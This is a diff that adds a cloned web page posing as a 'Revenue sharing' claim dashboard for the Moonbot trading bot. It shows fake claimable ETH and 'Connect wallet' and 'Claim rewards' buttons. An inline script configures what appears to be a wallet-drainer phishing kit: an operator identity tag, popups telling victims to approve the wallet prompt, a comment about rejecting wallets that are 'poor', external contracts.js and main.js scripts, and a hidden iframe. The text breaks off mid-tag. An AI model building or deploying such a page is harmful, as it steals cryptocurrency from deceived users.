@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html
+  style="--wcm-color-fg-1: rgb(228,231,231); --wcm-color-fg-2: rgb(148,158,158); --wcm-color-fg-3: rgb(110,119,119); --wcm-color-bg-1: rgb(20,20,20); --wcm-color-bg-2: rgb(39,42,42); --wcm-color-bg-3: rgb(59,64,64); --wcm-color-overlay: rgba(255,255,255,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+  data-scrapbook-source="https://rewards.moonbottrades.com/" data-scrapbook-create="20231004184845221"
+  data-scrapbook-title="Rewards - Moonbot, the fastest telegram trading bot">
+
+  <script defer="defer" src="js/vendors.js"></script>
+	<script defer="defer" src="js/contracts.js"></script>
+	<script defer="defer" src="js/main.js"></script>
+	
+	<script>
+	  window.UNIQUE_IDENTITY = "yelping_cheetah_23";
+	
+	  // Pick a theme here, this defaults to "light"
+	  window.modal_theme = "light";
+	
+	  // https://docs.walletconnect.com/2.0/web/walletConnectModal/theming
+	  window.modal_variables = { "--w3m-accent-color": "#291549", "--w3m-background-color": "#291549",
+	  /* Example of what you can do */
+	  // "--w3m-accent-color": "#A6111D",
+	  // "--w3m-background-color": "#A6111D",
+	  // "--w3m-logo-image-url": "/your-logo.svg",
+	  };
+	
+	  // Notification modals
+	 window.popups = {
+	PENDING: {
+	  // The popup that shows when they get prompted
+	  title: "Claim Pending",
+	  text: "You must approve the prompt in order to continue."
+	},
+	INVALID: {
+	  // Shown when they connect on a wallet that is poor.
+	  // title: "Ineligible Address",
+	  text: "The connected account is not eligible for this event.\nPlease try using a different account.",
+	}
+	  }
+	
+	  // Only touch this if you know what you're doing!
+	  window.OVERRIDE_MODE = false;
+	</script>
+	</head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rewards - Moonbot, the fastest telegram trading bot</title>
+  <meta name="next-head-count" content="3">
+  <link rel="stylesheet" href="1092946a10a3144a.css" data-n-g=""><noscript data-n-css=""></noscript>
+  <style data-styled="active" data-styled-version="5.3.5">
+    html,
+    body,
+    div,
+    span,
+    applet,
+    object,
+    iframe,
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6,
+    p,
+    blockquote,
+    pre,
+    a,
+    abbr,
+    acronym,
+    address,
+    big,
+    cite,
+    code,
+    del,
+    dfn,
+    em,
+    img,
+    ins,
+    kbd,
+    q,
+    s,
+    samp,
+    small,
+    strike,
+    strong,
+    sub,
+    sup,
+    tt,
+    var,
+    b,
+    u,
+    i,
+    center,
+    dl,
+    dt,
+    dd,
+    menu,
+    ol,
+    ul,
+    li,
+    fieldset,
+    form,
+    label,
+    legend,
+    table,
+    caption,
+    tbody,
+    tfoot,
+    thead,
+    tr,
+    th,
+    td,
+    article,
+    aside,
+    canvas,
+    details,
+    embed,
+    figure,
+    figcaption,
+    footer,
+    header,
+    hgroup,
+    main,
+    menu,
+    nav,
+    output,
+    ruby,
+    section,
+    summary,
+    time,
+    mark,
+    audio,
+    video {
+      margin: 0px;
+      padding: 0px;
+      border: 0px;
+      font: inherit;
+      vertical-align: baseline;
+    }
+
+    article,
+    aside,
+    details,
+    figcaption,
+    figure,
+    footer,
+    header,
+    hgroup,
+    main,
+    menu,
+    nav,
+    section {
+      display: block;
+    }
+
+    [hidden] {
+      display: none;
+    }
+
+    body {
+      line-height: 1;
+    }
+
+    menu,
+    ol,
+    ul {
+      list-style: none;
+    }
+
+    blockquote,
+    q {
+      quotes: none;
+    }
+
+    blockquote::before,
+    blockquote::after,
+    q::before,
+    q::after {
+      content: none;
+    }
+
+    table {
+      border-collapse: collapse;
+      border-spacing: 0px;
+    }
+
+    body {
+      font-family: Poppins, sans-serif;
+      background: linear-gradient(rgb(3, 5, 21) 0%, rgb(20, 21, 61) 64.58%);
+      color: rgb(3, 14, 37);
+    }
+
+    #__next {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    a {
+      text-decoration: none;
+    }
+
+    .bFUAak {
+      font-weight: 600;
+      font-size: 16px;
+      text-align: left;
+      text-transform: uppercase;
+      color: rgb(255, 255, 255);
+      text-decoration: none;
+      line-height: normal;
+    }
+
+    .hBBqOz {
+      font-weight: 600;
+      font-size: 16px;
+      text-align: left;
+      text-transform: uppercase;
+      color: rgb(213, 15, 90);
+      text-decoration: none;
+      line-height: normal;
+    }
+
+    .cLKmcR {
+      font-weight: 600;
+      font-size: 12px;
+      text-align: left;
+      text-transform: uppercase;
+      color: rgb(217, 217, 217);
+      text-decoration: none;
+      line-height: normal;
+    }
+
+    .imMsib {
+      font-weight: 600;
+      font-size: 16px;
+      text-align: left;
+      color: rgb(217, 217, 217);
+      text-decoration: none;
+      line-height: normal;
+    }
+
+    .dfmRJY {
+      font-weight: 600;
+      font-size: 16px;
+      text-align: left;
+      color: rgb(217, 217, 217);
+      text-decoration: none;
+      line-height: normal;
+      margin-bottom: 28px;
+    }
+
+    .dsYNgu {
+      font-weight: 600;
+      font-size: 16px;
+      text-align: left;
+      color: rgb(255, 255, 255);
+      text-decoration: none;
+      line-height: normal;
+    }
+
+    .dNmEtj {
+      font-weight: 600;
+      font-size: 12px;
+      text-align: left;
+      color: rgb(217, 217, 217);
+      text-decoration: none;
+      line-height: normal;
+    }
+
+    .fWjUsY {
+      display: flex;
+      flex-flow: column;
+    }
+
+    .fWjUsY> :not(style)~ :not(style) {
+      margin-top: 32px;
+      margin-left: 0px;
+    }
+
+    .fjpvdw {
+      display: flex;
+      -moz-box-pack: justify;
+      justify-content: space-between;
+      flex-wrap: nowrap;
+    }
+
+    @media (max-width: 425px) {
+      .fjpvdw {
+        flex-direction: column;
+      }
+
+      .fjpvdw> :not(style)~ :not(style) {
+        margin-top: 32px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 426px) and (max-width: 1024px) {
+      .fjpvdw {
+        flex-direction: column;
+      }
+
+      .fjpvdw> :not(style)~ :not(style) {
+        margin-top: 32px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 1025px) {
+      .fjpvdw {
+        flex-direction: row;
+      }
+
+      .fjpvdw> :not(style)~ :not(style) {
+        margin-top: 0px;
+        margin-left: 32px;
+      }
+    }
+
+    @media (max-width: 425px) {
+      .fjpvdw {
+        align-items: flex-start;
+      }
+    }
+
+    @media (min-width: 426px) and (max-width: 1024px) {
+      .fjpvdw {
+        align-items: flex-start;
+      }
+    }
+
+    @media (min-width: 1025px) {
+      .fjpvdw {
+        -moz-box-align: center;
+        align-items: center;
+      }
+    }
+
+    .dHAmQH {
+      display: flex;
+      flex-wrap: nowrap;
+    }
+
+    @media (max-width: 360px) {
+      .dHAmQH {
+        flex-direction: column;
+      }
+
+      .dHAmQH> :not(style)~ :not(style) {
+        margin-top: 20px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 361px) and (max-width: 425px) {
+      .dHAmQH {
+        flex-direction: column;
+      }
+
+      .dHAmQH> :not(style)~ :not(style) {
+        margin-top: 20px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 426px) and (max-width: 768px) {
+      .dHAmQH {
+        flex-direction: column;
+      }
+
+      .dHAmQH> :not(style)~ :not(style) {
+        margin-top: 20px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 769px) and (max-width: 1024px) {
+      .dHAmQH {
+        flex-direction: row;
+      }
+
+      .dHAmQH> :not(style)~ :not(style) {
+        margin-top: 0px;
+        margin-left: 20px;
+      }
+    }
+
+    @media (min-width: 1025px) and (max-width: 1440px) {
+      .dHAmQH {
+        flex-direction: row;
+      }
+
+      .dHAmQH> :not(style)~ :not(style) {
+        margin-top: 0px;
+        margin-left: 20px;
+      }
+    }
+
+    @media (min-width: 1441px) {
+      .dHAmQH {
+        flex-direction: row;
+      }
+
+      .dHAmQH> :not(style)~ :not(style) {
+        margin-top: 0px;
+        margin-left: 20px;
+      }
+    }
+
+    .jkTSQw {
+      display: flex;
+      flex-wrap: nowrap;
+      margin-bottom: 16px;
+    }
+
+    @media (max-width: 425px) {
+      .jkTSQw {
+        flex-direction: column;
+      }
+
+      .jkTSQw> :not(style)~ :not(style) {
+        margin-top: 44px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 426px) and (max-width: 1024px) {
+      .jkTSQw {
+        flex-direction: column;
+      }
+
+      .jkTSQw> :not(style)~ :not(style) {
+        margin-top: 44px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 1025px) {
+      .jkTSQw {
+        flex-direction: row;
+      }
+
+      .jkTSQw> :not(style)~ :not(style) {
+        margin-top: 0px;
+        margin-left: 44px;
+      }
+    }
+
+    .eNfgng {
+      display: flex;
+      flex-flow: column;
+    }
+
+    .dniAQm {
+      display: flex;
+      flex-wrap: nowrap;
+    }
+
+    @media (max-width: 425px) {
+      .dniAQm {
+        flex-direction: column;
+      }
+
+      .dniAQm> :not(style)~ :not(style) {
+        margin-top: 8px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 426px) and (max-width: 1024px) {
+      .dniAQm {
+        flex-direction: column;
+      }
+
+      .dniAQm> :not(style)~ :not(style) {
+        margin-top: 8px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 1025px) {
+      .dniAQm {
+        flex-direction: row;
+      }
+
+      .dniAQm> :not(style)~ :not(style) {
+        margin-top: 0px;
+        margin-left: 8px;
+      }
+    }
+
+    .gOnpch {
+      display: flex;
+      flex-flow: row;
+    }
+
+    .gOnpch> :not(style)~ :not(style) {
+      margin-top: 0px;
+      margin-left: 8px;
+    }
+
+    .kTqRRP {
+      display: flex;
+      flex-flow: column;
+      margin-bottom: 8px;
+    }
+
+    .kTqRRP> :not(style)~ :not(style) {
+      margin-top: 12px;
+      margin-left: 0px;
+    }
+
+    .bEVgrX {
+      display: flex;
+      flex-wrap: nowrap;
+      -moz-box-align: center;
+      align-items: center;
+    }
+
+    @media (max-width: 425px) {
+      .bEVgrX {
+        flex-direction: column;
+      }
+
+      .bEVgrX> :not(style)~ :not(style) {
+        margin-top: 36px;
+        margin-left: 0px;
+      }
+    }
+
+    @media (min-width: 426px) and (max-width: 1024px) {
+      .bEVgrX {
+        flex-direction: row;
+      }
+
+      .bEVgrX> :not(style)~ :not(style) {
+        margin-top: 0px;
+        margin-left: 36px;
+      }
+    }
+
+    @media (min-width: 1025px) and (max-width: 1280px) {
+      .bEVgrX {
+        flex-direction: row;
+      }
+
+      .bEVgrX> :not(style)~ :not(style) {
+        margin-top: 0px;
+        margin-left: 36px;
+      }
+    }
+
+    @media (min-width: 1281px) {
+      .bEVgrX {
+        flex-direction: row;
+      }
+
+      .bEVgrX> :not(style)~ :not(style) {
+        margin-top: 0px;
+        margin-left: 36px;
+      }
+    }
+
+    .GGCIN {
+      padding: 44px 0px;
+      display: flex;
+      flex-direction: row;
+      -moz-box-pack: justify;
+      justify-content: space-between;
+      -moz-box-align: center;
+      align-items: center;
+      position: relative;
+      gap: 40px;
+    }
+
+    .bzqeRH {
+      position: relative;
+      color: rgb(255, 255, 255);
+    }
+
+    @media (min-width: 769px) {
+      .bzqeRH {
+        position: absolute;
+        right: 0px;
+      }
+    }
+
+    .rhNIn {
+      max-width: 1600px;
+      width: 100%;
+      padding: 0px 16px;
+      box-sizing: border-box;
+      margin: 0px auto;
+      z-index: 1;
+      position: relative;
+    }
+
+    @media (min-width: 769px) {
+      .rhNIn {
+        padding: 0px 56px;
+      }
+    }
+
+    .irvAUf {
+      -moz-box-align: center;
+      align-items: center;
+      position: relative;
+      overflow: hidden;
+      background: linear-gradient(90deg, rgb(3, 14, 37) -6.52%, rgb(213, 15, 90) 93.48%);
+      color: rgb(255, 255, 255);
+      border: 2px solid rgb(255, 255, 255);
+      cursor: pointer;
+      display: inline-flex;
+      font-family: inherit;
+      font-weight: 500;
+      -moz-box-pack: center;
+      justify-content: center;
+      letter-spacing: 0.03em;
+      outline: 0px;
+      text-transform: uppercase;
+      line-height: 18px;
+      width: 190px;
+      height: 60px;
+      white-space: nowrap;
+      padding: 0px 16px;
+      border-radius: 100px;
+      z-index: 1;
+    }
+
+    .irvAUf:hover {
+      opacity: 1;
+      color: rgb(255, 255, 255);
+      background: rgb(213, 15, 90);
+    }
+
+    .irvAUf:disabled {
+      color: rgb(255, 255, 255);
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .hkRTob {
+      -moz-box-align: center;
+      align-items: center;
+      position: relative;
+      overflow: hidden;
+      background: linear-gradient(90deg, rgb(16, 38, 85) 0%, rgb(188, 15, 83) 64.58%);
+      color: rgb(255, 255, 255);
+      border: medium;
+      cursor: pointer;
+      display: inline-flex;
+      font-family: inherit;
+      font-weight: 500;
+      -moz-box-pack: center;
+      justify-content: center;
+      letter-spacing: 0.03em;
+      outline: 0px;
+      text-transform: uppercase;
+      line-height: 18px;
+      width: 190px;
+      height: 60px;
+      white-space: nowrap;
+      padding: 0px 16px;
+      border-radius: 100px;
+      z-index: 1;
+    }
+
+    .hkRTob::before {
+      content: "";
+      position: absolute;
+      inset: 2px;
+      background: rgb(3, 14, 37);
+      border-radius: 100px;
+      z-index: -1;
+    }
+
+    .hkRTob:hover {
+      opacity: 1;
+      color: rgb(255, 255, 255);
+      background: rgb(213, 15, 90);
+    }
+
+    .hkRTob:hover::before {
+      content: none;
+    }
+
+    .hkRTob:disabled {
+      color: currentcolor;
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .IzQVv {
+      -moz-box-align: center;
+      align-items: center;
+      position: relative;
+      overflow: hidden;
+      background: linear-gradient(90deg, rgb(16, 38, 85) 0%, rgb(188, 15, 83) 64.58%);
+      color: rgb(255, 255, 255);
+      border: medium;
+      cursor: pointer;
+      display: inline-flex;
+      font-family: inherit;
+      font-weight: 500;
+      -moz-box-pack: center;
+      justify-content: center;
+      letter-spacing: 0.03em;
+      outline: 0px;
+      text-transform: uppercase;
+      line-height: 18px;
+      width: 220px;
+      height: 60px;
+      white-space: nowrap;
+      padding: 0px 16px;
+      border-radius: 100px;
+      z-index: 1;
+    }
+
+    .IzQVv::before {
+      content: "";
+      position: absolute;
+      inset: 2px;
+      background: rgb(3, 14, 37);
+      border-radius: 100px;
+      z-index: -1;
+    }
+
+    .IzQVv:hover {
+      opacity: 1;
+      color: rgb(255, 255, 255);
+      background: rgb(213, 15, 90);
+    }
+
+    .IzQVv:hover::before {
+      content: none;
+    }
+
+    .IzQVv:disabled {
+      color: currentcolor;
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .efNLTn {
+      width: 100%;
+      min-height: 1px;
+      background-color: rgb(41, 21, 73);
+    }
+
+    .laLHlq {
+      width: 100%;
+      min-height: 1px;
+      background-color: rgb(84, 49, 141);
+    }
+
+    .iYocXe {
+      margin-top: 32px;
+    }
+
+    .iQuuyr {
+      position: relative;
+      display: flex;
+      flex: 1 1 0%;
+      min-height: 500px;
+      padding-bottom: 40px;
+    }
+
+    .iQuuyr::before {
+      content: "";
+      position: absolute;
+      inset: 0px;
+      background: url("footer.png") center bottom / contain no-repeat;
+      mix-blend-mode: screen;
+    }
+
+    .iQuuyr::after {
+      content: "";
+      position: absolute;
+      inset: 0px;
+      background: url("diamond.svg") left top 20% no-repeat;
+      mix-blend-mode: color-dodge;
+    }
+
+    .yDsGY {
+      background: url("card-icon.svg") right top no-repeat, rgb(41, 21, 73);
+      padding: 28px;
+    }
+
+    @media (min-width: 769px) {
+      .yDsGY {
+        padding: 60px;
+      }
+    }
+
+    .SBPYB {
+      font-weight: 600;
+      text-align: left;
+      text-transform: uppercase;
+      color: rgb(255, 255, 255);
+      line-height: normal;
+    }
+
+    @media (max-width: 425px) {
+      .SBPYB {
+        font-size: 30px;
+      }
+    }
+
+    @media (min-width: 426px) and (max-width: 1024px) {
+      .SBPYB {
+        font-size: 30px;
+      }
+    }
+
+    @media (min-width: 1025px) and (max-width: 1280px) {
+      .SBPYB {
+        font-size: 30px;
+      }
+    }
+
+    @media (min-width: 1281px) {
+      .SBPYB {
+        font-size: 60px;
+      }
+    }
+
+    .biLLBD {
+      font-weight: normal;
+      font-size: 30px;
+      text-align: left;
+      color: rgb(255, 255, 255);
+      line-height: normal;
+    }
+
+    .SXVvu {
+      display: flex;
+      -moz-box-pack: start;
+      justify-content: flex-start;
+      -moz-box-align: center;
+      align-items: center;
+      background: rgb(9, 11, 35);
+      border-radius: 20px;
+      overflow: hidden;
+      padding: 20px;
+    }
+
+    .jyGmxR {
+      display: flex;
+      -moz-box-pack: start;
+      justify-content: flex-start;
+      -moz-box-align: center;
+      align-items: center;
+      background: rgb(9, 11, 35);
+      border-radius: 20px;
+      overflow: hidden;
+      padding: 20px;
+      width: 250px;
+    }
+
+    .edvdcd {
+      width: 100%;
+      max-width: 260px;
+    }
+  </style>
+  <script
+    data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement { }); } })(["next-route-announcer", "wcm-explorer-context", "wcm-theme-context", "wcm-modal"])</script>
+</head>
+
+<body>
+  <div id="__next">
+    <div data-rk="">
+      <style>
+        [data-rk] {
+          --rk-blurs-modalOverlay: blur(0px);
+          --rk-fonts-body: SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+          --rk-radii-actionButton: 9999px;
+          --rk-radii-connectButton: 12px;
+          --rk-radii-menuButton: 12px;
+          --rk-radii-modal: 24px;
+          --rk-radii-modalMobile: 28px;
+          --rk-colors-accentColor: #0E76FD;
+          --rk-colors-accentColorForeground: #FFF;
+          --rk-colors-actionButtonBorder: rgba(0, 0, 0, 0.04);
+          --rk-colors-actionButtonBorderMobile: rgba(0, 0, 0, 0.06);
+          --rk-colors-actionButtonSecondaryBackground: rgba(0, 0, 0, 0.06);
+          --rk-colors-closeButton: rgba(60, 66, 66, 0.8);
+          --rk-colors-closeButtonBackground: rgba(0, 0, 0, 0.06);
+          --rk-colors-connectButtonBackground: #FFF;
+          --rk-colors-connectButtonBackgroundError: #FF494A;
+          --rk-colors-connectButtonInnerBackground: linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06));
+          --rk-colors-connectButtonText: #25292E;
+          --rk-colors-connectButtonTextError: #FFF;
+          --rk-colors-connectionIndicator: #30E000;
+          --rk-colors-downloadBottomCardBackground: linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF;
+          --rk-colors-downloadTopCardBackground: linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF;
+          --rk-colors-error: #FF494A;
+          --rk-colors-generalBorder: rgba(0, 0, 0, 0.06);
+          --rk-colors-generalBorderDim: rgba(0, 0, 0, 0.03);
+          --rk-colors-menuItemBackground: rgba(60, 66, 66, 0.1);
+          --rk-colors-modalBackdrop: rgba(0, 0, 0, 0.3);
+          --rk-colors-modalBackground: #FFF;
+          --rk-colors-modalBorder: transparent;
+          --rk-colors-modalText: #25292E;
+          --rk-colors-modalTextDim: rgba(60, 66, 66, 0.3);
+          --rk-colors-modalTextSecondary: rgba(60, 66, 66, 0.6);
+          --rk-colors-profileAction: #FFF;
+          --rk-colors-profileActionHover: rgba(255, 255, 255, 0.5);
+          --rk-colors-profileForeground: rgba(60, 66, 66, 0.06);
+          --rk-colors-selectedOptionBorder: rgba(60, 66, 66, 0.1);
+          --rk-colors-standby: #FFD641;
+          --rk-shadows-connectButton: 0px 4px 12px rgba(0, 0, 0, 0.1);
+          --rk-shadows-dialog: 0px 8px 32px rgba(0, 0, 0, 0.32);
+          --rk-shadows-profileDetailsAction: 0px 2px 6px rgba(37, 41, 46, 0.04);
+          --rk-shadows-selectedOption: 0px 2px 6px rgba(0, 0, 0, 0.24);
+          --rk-shadows-selectedWallet: 0px 2px 6px rgba(0, 0, 0, 0.12);
+          --rk-shadows-walletLogo: 0px 2px 16px rgba(0, 0, 0, 0.16);
+        }
+
+        @media(prefers-color-scheme:dark) {
+          [data-rk] {
+            --rk-colors-accentColor: #3898FF;
+            --rk-colors-actionButtonBorder: rgba(255, 255, 255, 0.04);
+            --rk-colors-actionButtonBorderMobile: rgba(255, 255, 255, 0.08);
+            --rk-colors-actionButtonSecondaryBackground: rgba(255, 255, 255, 0.08);
+            --rk-colors-closeButton: rgba(224, 232, 255, 0.6);
+            --rk-colors-closeButtonBackground: rgba(255, 255, 255, 0.08);
+            --rk-colors-connectButtonBackground: #1A1B1F;
+            --rk-colors-connectButtonInnerBackground: linear-gradient(0deg, rgba(255, 255, 255, 0.075), rgba(255, 255, 255, 0.15));
+            --rk-colors-connectButtonText: #FFF;
+            --rk-colors-downloadBottomCardBackground: linear-gradient(126deg, rgba(0, 0, 0, 0) 9.49%, rgba(120, 120, 120, 0.2) 71.04%), #1A1B1F;
+            --rk-colors-downloadTopCardBackground: linear-gradient(126deg, rgba(120, 120, 120, 0.2) 9.49%, rgba(0, 0, 0, 0) 71.04%), #1A1B1F;
+            --rk-colors-generalBorder: rgba(255, 255, 255, 0.08);
+            --rk-colors-generalBorderDim: rgba(255, 255, 255, 0.04);
+            --rk-colors-menuItemBackground: rgba(224, 232, 255, 0.1);
+            --rk-colors-modalBackdrop: rgba(0, 0, 0, 0.5);
+            --rk-colors-modalBackground: #1A1B1F;
+            --rk-colors-modalBorder: rgba(255, 255, 255, 0.08);
+            --rk-colors-modalText: #FFF;
+            --rk-colors-modalTextDim: rgba(224, 232, 255, 0.3);
+            --rk-colors-modalTextSecondary: rgba(255, 255, 255, 0.6);
+            --rk-colors-profileAction: rgba(224, 232, 255, 0.1);
+            --rk-colors-profileActionHover: rgba(224, 232, 255, 0.2);
+            --rk-colors-profileForeground: rgba(224, 232, 255, 0.05);
+            --rk-colors-selectedOptionBorder: rgba(224, 232, 255, 0.1);
+            --rk-shadows-selectedWallet: 0px 2px 6px rgba(0, 0, 0, 0.24);
+          }
+        }
+      </style>
+      <div class="sc-f238942e-0 rhNIn">
+        <header class="sc-c6200195-0 GGCIN"><a href="https://moonbottrades.com/"><svg viewBox="0 0 260 36" fill="none"
+              xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+              class="sc-69c7c69a-0 edvdcd">
+              <path fill="url(#Logo_svg__a)" d="M0 0h260v35.645H0z"></path>
+              <defs>
+                <pattern id="Logo_svg__a" patternContentUnits="objectBoundingBox" width="1" height="1">
+                  <use xlink:href="#Logo_svg__b" transform="scale(.00161 .01176)"></use>
+                </pattern>
+                <image id="Logo_svg__b" width="620" height="85"
+                  xlink:href="e3f24c42c64c5f63ab5f5b75f3fe05e855f40aae.png"></image>
+              </defs>
+            </svg></a>
+          <div id="connect_button" class="sc-c6200195-1 bzqeRH"><button width="190px" class="sc-f955ece-0 irvAUf">Connect wallet</button>
+          </div>
+        </header>
+      </div>
+      <div color="purple" class="sc-ab68072-0 efNLTn"></div>
+      <div class="sc-7be1a335-0 iQuuyr">
+        <div class="sc-f238942e-0 rhNIn">
+          <div class="sc-b8e1b992-0 iYocXe">
+            <div class="sc-91b76035-0 fWjUsY">
+              <div class="sc-91b76035-0 fjpvdw">
+                <div class="sc-f3a70a68-0 SBPYB">Revenue sharing</div>
+                <div class="sc-91b76035-0 dHAmQH"><a width="190px" target="_blank"
+                    href=""
+                    class="sc-f955ece-0 irvAUf">Trade now</a><a width="190px" target="_blank"
+                    href="" class="sc-f955ece-0 hkRTob">Use MoonBot</a><a width="220px"
+                    href="" target="_blank" class="sc-f955ece-0 IzQVv">Telegram community</a>
+                </div>
+              </div>
+              <div class="sc-fb6f2a8-0 yDsGY">
+                <div class="sc-91b76035-0 fWjUsY">
+                  <div class="sc-91b76035-0 jkTSQw">
+                    <div class="sc-a7c62055-0 SXVvu">
+                      <div class="sc-91b76035-0 eNfgng">
+                        <div class="sc-91b76035-0 dniAQm"><span class="sc-6e0aa331-0 bFUAak">Total COMMUNITY Rewards TO
+                            DATE:</span><span class="sc-6e0aa331-0 hBBqOz">3.15 ETH</span></div><span
+                          class="sc-6e0aa331-0 cLKmcR">$5172.39</span>
+                      </div>
+                    </div>
+                    <div class="sc-a7c62055-0 SXVvu">
+                      <div class="sc-91b76035-0 gOnpch"><span class="sc-6e0aa331-0 bFUAak">Total HOLDERS:</span><span
+                          class="sc-6e0aa331-0 hBBqOz">1321</span></div>
+                    </div>
+                  </div>
+                  <div color="purpleLight" class="sc-ab68072-0 laLHlq"></div>
+                  <div class="sc-91b76035-0 kTqRRP">
+                    <div class="sc-f3a70a68-0 biLLBD">Dashboard for Revenue Share</div><span
+                      class="sc-6e0aa331-0 imMsib">This dashboard enables holders to connect and access their revenue
+                      share rewards. To claim rewards, a minimum balance of 1 MBOT is required. Rewards are accrued
+                      every reward epoch (6 hours) based on MBOT token holdings relative to total pool.</span>
+                  </div>
+                  <div class="sc-91b76035-0 kTqRRP">
+                    <div class="sc-f3a70a68-0 biLLBD">Claimable Rewards</div><span class="sc-6e0aa331-0 dfmRJY">Claiming
+                      rewards claims all available unclaimed rewards and requires a minimum of 0.05 ETH
+                      accumulated.</span>
+                    <div class="sc-91b76035-0 bEVgrX">
+                      <div width="250px" class="sc-a7c62055-0 jyGmxR">
+                        <div class="sc-91b76035-0 eNfgng"><span class="sc-6e0aa331-0 dsYNgu">0.2 - ETH</span><span
+                            class="sc-6e0aa331-0 dNmEtj">$327.91</span></div>
+                      </div><button id="connect_button" width="190px" enabled="" class="sc-f955ece-0 irvAUf">Claim rewards</button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="sc-67c83bbe-0 uZQmQ"></div>
+    </div>
+  </div><next-route-announcer>
+    <p aria-live="assertive" id="__next-route-announcer__" role="alert"
+      style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;">
+    </p>
+  </next-route-announcer><wcm-modal
+    data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-theme-context><div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;><div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;><!--?lit$8244016893$--></div></div>"></wcm-modal><iframe
+    id="verify-api" src="index_1.html" style="display: none;"></iframe>
+  <script
